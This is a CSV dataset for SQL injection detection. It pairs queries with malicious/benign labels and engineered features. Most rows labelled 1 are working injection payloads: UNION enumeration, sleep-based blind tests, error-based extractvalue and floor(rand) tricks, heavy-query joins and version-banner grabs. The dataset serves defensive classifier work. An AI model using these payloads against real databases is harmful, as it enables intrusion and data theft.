Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
"1%'  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7,181,25,1,0,8,1,28,1,3,109,10,1
"1' and make_set  (  3445  =  5963,5963  )   and 'wjfw'  =  'wjfw",1,and make_set and wjfw wjfw,64,5,4,0,4,0,11,2,0,21,2,1
select eager ( s )  from crew full outer join,0,select eager from crew full outer join,45,7,0,0,0,0,9,0,0,33,4,0
malia,0,malia,5,1,0,0,0,0,0,0,0,5,0,0
1'  )   as kqbh where 6138  =  6138,1,as kqbh where,35,3,1,0,1,0,7,0,0,11,2,0
"-8608"" or 5460  =  4461--",1,or,25,1,0,1,1,1,4,1,3,2,0,0
sorbello8@carrillo-de-albornoz.jobs,0,sorbello8 carrillo de albornoz jobs,35,5,0,0,2,0,0,0,2,30,0,0
-2820'   )    )    or 6679  =  8848--,1,or,37,1,1,0,1,1,6,1,3,2,0,0
"-4947' in boolean mode  )   union all select 3314,3314#",1,in boolean mode union all select,55,6,1,0,2,1,8,0,1,27,4,0
enjoyelada,0,enjoyelada,10,1,0,0,0,0,0,0,0,10,0,0
"select * from customers where city  =  @city go; exec selectallcustomers @city  =  'london'; create procedure selectallcustomers @city nvarchar ( 30 ) , @postalcode nvarchar ( 10 )  as ",0,select from customers where city city go exec selectallcustomers city london create procedure selectallcustomers city nvarchar postalcode nvarchar as,185,19,2,0,9,0,29,0,1,131,5,1
"1'   )    )    as xntz where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,as xntz where or row select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from select union select union select union select group by,333,24,1,0,9,1,64,1,5,109,15,5
5296,0,,4,0,0,0,0,0,0,0,0,0,0,0
select min ( large )  as hardly from century,0,select min large as hardly from century,44,7,0,0,0,0,8,0,0,33,3,0
 update writer set draw = 'simple'where eat = 'gradually',0,update writer set draw simple where eat gradually,57,8,4,0,2,0,9,0,0,42,3,0
select * from express,0,select from express,21,3,0,0,0,0,3,0,1,17,2,0
31788831w,0,31788831w,9,1,0,0,0,0,0,0,0,1,0,0
1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1,and cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric,337,21,1,0,24,0,73,1,0,75,8,10
24152,0,,5,0,0,0,0,0,0,0,0,0,0,0
"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",1,as ajxq where union all select,94,6,0,0,6,1,12,0,3,25,5,0
"select * from baseball where elephant between ""suppose"" and    ""gas""",0,select from baseball where elephant between suppose and gas,68,9,0,4,0,0,9,1,1,51,5,0
select * from train where sometime = 'flag'  or circle = 'battle',0,select from train where sometime flag or circle battle,65,9,4,0,2,0,11,1,1,46,4,0
select top 3 * from ought where brain = 'birthday' select * from major,0,select top from ought where brain birthday select from major,70,10,2,0,1,0,13,0,2,51,6,0
11800455y,0,11800455y,9,1,0,0,0,0,0,0,0,1,0,0
carstens,0,carstens,8,1,0,0,0,0,0,0,0,8,0,0
select * from slight where indeed in  ( select hard from describe ) ,0,select from slight where indeed in select hard from describe,68,10,0,0,0,0,13,0,1,51,6,0
"   select count ( for ) , you from lady by especially",0,select count for you from lady by especially,53,8,0,0,1,0,11,0,0,37,3,1
"  select * from customers   where country in  ( 'germany', 'france', 'uk' ) ; ",0,select from customers where country in germany france uk,78,9,6,0,3,0,14,0,1,48,4,0
"1%""   )    )    union all select null,null,null#",1,union all select null null null,48,6,0,1,4,1,6,0,0,26,6,0
select limited ( s )  from found union all,0,select limited from found union all,42,6,0,0,0,0,8,0,0,31,4,0
"-7084  )   where 2260  =  2260 or elt  (  1032  =  1032,3623  )  --",1,where or elt,67,3,0,0,3,1,13,1,3,10,2,1
delete from compare where surprise = 'enemy',0,delete from compare where surprise enemy,44,6,2,0,1,0,6,0,0,35,3,0
select parent ( s )  from gently left join,0,select parent from gently left join,42,6,0,0,0,0,8,0,0,31,4,1
select   (  case when   (  8857  =  1512  )   then 8857 else 8857*  (  select 8857 from mysql.db  )   end  )  #,1,select case when then else select from mysql db end,111,10,0,0,3,1,21,0,1,42,8,0
"  update second set rocket =  'hearing', city =  'use' where test =  slept",0,update second set rocket hearing city use where test slept,74,10,4,0,4,0,13,0,0,49,3,0
argem grive,0,argem grive,11,2,0,0,0,0,1,0,0,10,0,0
pereda barrio,0,pereda barrio,13,2,0,0,0,0,1,0,0,12,0,0
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1,select from users where id or or,63,7,0,2,3,1,18,2,3,26,5,0
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,select from users where id union select null banner from version where rownum,101,13,0,0,4,1,19,0,3,66,8,1
"1"" where 8379  =  8379 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,where and select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,150,21,0,1,9,1,25,1,3,77,8,1
select top 3 * from religious where police = 'raise' select * from muscle,0,select top from religious where police raise select from muscle,73,10,2,0,1,0,13,0,2,54,6,0
10328,0,,5,0,0,0,0,0,0,0,0,0,0,0
 and 1  =  0  )   union all,1,and union all,27,3,0,0,1,0,7,1,0,11,3,0
" select * from alone order by mind, two",0,select from alone order by mind two,39,7,0,0,1,0,8,0,1,29,4,0
"1""   )    )    union all select null,null,null,null,null--",1,union all select null null null null null,58,8,0,1,4,1,6,0,2,34,8,0
"-4983%""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1,or dbms_utility sqlid_to_sqlhash chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and,365,22,0,4,29,0,74,2,1,93,9,12
select top 50 percent * from became select * from road fetch first 50 percent rows onlyselect top 3 * from salt,0,select top percent from became select from road fetch first percent rows onlyselect top from salt,111,16,0,0,0,0,21,0,3,82,8,0
"1""   )    )    as swwb where 4244  =  4244",1,as swwb where,42,3,0,1,1,0,8,0,0,11,2,0
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'gfll'  =  'gfll",1,procedure analyse extractvalue concat 0x5c 0x7171706a71 select case when then else end 0x717a767a71 and gfll gfll,243,16,4,0,7,0,40,1,0,77,7,4
duilio,0,duilio,6,1,0,0,0,0,0,0,0,6,0,0
boothe,0,boothe,6,1,0,0,0,0,0,0,0,6,0,0
29540,0,,5,0,0,0,0,0,0,0,0,0,0,0
select * from band where simplest between individual09/01/1996example and gradually15/31/1996dress,0,select from band where simplest between individual09 1996example and gradually15 1996dress,98,11,0,0,0,0,9,1,5,68,5,0
delete from deeply,0,delete from deeply,18,3,0,0,0,0,2,0,0,16,2,0
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'thce'  =  'thce",1,or exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and thce thce,201,14,4,0,7,0,36,2,1,54,6,3
4.43193e+15,0,43193e,11,1,0,0,1,0,0,0,1,1,0,0
select * from happy where establish between complete09/01/1996basic and within15/31/1996wish,0,select from happy where establish between complete09 1996basic and within15 1996wish,92,11,0,0,0,0,9,1,5,62,5,0
bancroft@lawn.mc,0,bancroft lawn mc,16,3,0,0,2,0,0,0,0,14,0,0
select * from simply order by desk desc,0,select from simply order by desk desc,39,7,0,0,0,0,7,0,1,31,5,0
select * from discover where sun = 'carefully' limit 3,0,select from discover where sun carefully limit,54,7,2,0,1,0,9,0,1,40,4,0
select * from left where form  between 10 and 20,0,select from left where form between and,48,7,0,0,0,0,9,1,1,33,6,1
zapach,0,zapach,6,1,0,0,0,0,0,0,0,6,0,0
48483117z,0,48483117z,9,1,0,0,0,0,0,0,0,1,0,0
"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""%""  =  """,1,and select from select sleep fzno and,128,7,0,4,3,0,26,2,1,31,5,1
shihhai0,0,shihhai0,8,1,0,0,0,0,0,0,0,7,0,0
"select 'supplier', contactname, city, country from suppliers;",0,select supplier contactname city country from suppliers,61,7,2,0,4,0,6,0,0,49,2,0
"-1964'  )   as ihsp where 6379  =  6379 or elt  (  6945  =  6165,6165  )  --",1,as ihsp where or elt,76,5,1,0,3,1,15,1,3,16,3,1
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq",1,and select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3 and jgoq jgoq,178,19,0,4,7,0,28,2,1,83,7,1
select tobacco from newspaper union all select numeral from stared order by substance,0,select tobacco from newspaper union all select numeral from stared order by substance,85,13,0,0,0,0,12,0,0,73,8,0
"-6681""  )   or 5251  =  1162",1,or,28,1,0,1,1,0,5,1,1,2,0,0
select avg ( relationship ) from fox,0,select avg relationship from fox,36,5,0,0,0,0,6,0,0,28,2,1
1'+  (  select dklj where 3265  =  3265,1,select dklj where,39,3,1,0,1,0,7,0,1,15,2,0
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",1,select from select sleep srmq and vjlr like vjlr,99,9,0,3,0,0,20,1,1,40,5,1
"1"" where 8918  =  8918   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,where select case when then regexp_substring repeat left crypt_key char char char null null else char char char char end from values,356,22,0,1,18,1,71,0,2,109,12,11
select * from expression 3,0,select from expression,26,3,0,0,0,0,4,0,1,20,2,0
"  select about,bigger from began where vote = 'wire' union select captain, essential from growth",0,select about bigger from began where vote wire union select captain essential from growth,96,14,2,0,3,0,14,0,0,76,6,0
select chance ( s ) from task inner join,0,select chance from task inner join,40,6,0,0,0,0,8,0,0,30,4,0
4.80152e+15,0,80152e,11,1,0,0,1,0,0,0,1,1,0,0
" select * from worth order by oxygen, follow",0,select from worth order by oxygen follow,44,7,0,0,1,0,8,0,1,34,4,0
ardurn,0,ardurn,6,1,0,0,0,0,0,0,0,6,0,0
select * from afraid where rays = 'roar',0,select from afraid where rays roar,40,6,2,0,1,0,7,0,1,29,3,0
"select nullif ( ""2017-08-25"", ""2017-08-25"" ) ;",0,select nullif,46,2,0,4,2,0,6,0,4,12,1,1
"select * from cookies where roof between ""zulu"" and    ""suit""",0,select from cookies where roof between zulu and suit,61,9,0,4,0,0,9,1,1,44,5,0
"   select music, noun, where from she where rather  is null",0,select music noun where from she where rather is null,59,10,0,0,2,0,10,0,0,44,6,0
select * from bend  where own not like '[needle]%',0,select from bend where own not like needle,50,8,2,0,3,0,8,1,1,35,5,0
aldeano,0,aldeano,7,1,0,0,0,0,0,0,0,7,0,0
"1""   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""fkip""  =  ""fkip",1,and convert int select char char char char char select case when then char else char end char char char char char and fkip fkip,391,25,0,4,4,0,82,2,10,103,9,12
doan7,0,doan7,5,1,0,0,0,0,0,0,0,4,0,0
ferris,0,ferris,6,1,0,0,0,0,0,0,0,6,0,0
8182,0,,4,0,0,0,0,0,0,0,0,0,0,0
select count ( thumb ) from elephant,0,select count thumb from elephant,36,5,0,0,0,0,6,0,0,28,2,1
c406l2n5,0,c406l2n5,8,1,0,0,0,0,0,0,0,3,0,0
" select * from his order by gulf, perfectly",0,select from his order by gulf perfectly,43,7,0,0,1,0,8,0,1,33,4,0
select * from cup 3 select * from jungle,0,select from cup select from jungle,40,6,0,0,0,0,8,0,2,29,4,0
select * from divide where went = 'selection' limit 3,0,select from divide where went selection limit,53,7,2,0,1,0,9,0,1,39,4,0
"  select orders.knownrid, employees.whale, employees.instead from ordersright join employees on orders.employeeid  =  employees.settlersid order by orders.houseid",0,select orders knownrid employees whale employees instead from ordersright join employees on orders employeeid employees settlersid order by orders houseid,162,20,0,0,9,0,15,0,0,135,6,0
select * from goes where fell between invented09/01/1996needs and bigger15/31/1996atmosphere,0,select from goes where fell between invented09 1996needs and bigger15 1996atmosphere,92,11,0,0,0,0,9,1,5,62,5,0
"1""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fktl""  =  ""fktl",1,and convert int select char char char char char select case when then char else char end char char char char char and fktl fktl,401,25,0,4,4,0,84,2,10,103,9,12
select * from applied where light not like '[slowly]%',0,select from applied where light not like slowly,54,8,2,0,3,0,8,1,1,40,5,0
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'rqyz'  =  'rqyz",1,and char char char char regexp_substring repeat right char null and rqyz rqyz,209,13,4,0,12,0,40,2,0,64,4,8
solar,0,solar,5,1,0,0,0,0,0,0,0,5,0,0
select top 3 * from city,0,select top from city,24,4,0,0,0,0,5,0,1,17,3,0
"insert into slowly  ( sight, tree, feature )  values  ( 'farmer', 'means', 'but' )  ",0,insert into slowly sight tree feature values farmer means but,84,10,6,0,4,0,14,0,0,52,3,0
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'yhkr'  =  'yhkr",1,or select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4 and yhkr yhkr,148,23,4,0,9,0,24,2,1,82,8,1
tunaroza capmany,0,tunaroza capmany,16,2,0,0,0,0,1,0,0,15,0,0
"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",1,union all select,67,3,1,0,5,1,6,0,3,14,3,0
select count ( sweet ) from lonely,0,select count sweet from lonely,34,5,0,0,0,0,6,0,0,26,2,1
"-8203""  )   union all select 6394,6394,6394,6394,6394--",1,union all select,55,3,0,1,4,1,5,0,3,14,3,0
select * from hill where    not beyond = 'great',0,select from hill where not beyond great,48,7,2,0,1,0,8,1,1,33,4,0
warwicke@discon.mm,0,warwicke discon mm,18,3,0,0,2,0,0,0,0,16,0,0
"-1869""   )    )     )   union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--",1,union all select,87,3,0,1,8,1,7,0,3,14,3,0
fuentes claras,0,fuentes claras,14,2,0,0,0,0,1,0,0,13,0,0
select * from dig where danger = 'son'  or court = 'balance',0,select from dig where danger son or court balance,60,9,4,0,2,0,11,1,1,41,4,0
select * from yard fetch first 3 rows only,0,select from yard fetch first rows only,42,7,0,0,0,0,8,0,1,32,3,0
"  select after,instance from cheese where wise = 'wall' union select consonant, cave from plane",0,select after instance from cheese where wise wall union select consonant cave from plane,95,14,2,0,3,0,14,0,0,75,6,0
-7874   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  2817  =  2817,1,or in char char char char char select case when then char else char end char char char char char and,383,21,0,0,2,0,81,2,11,80,9,12
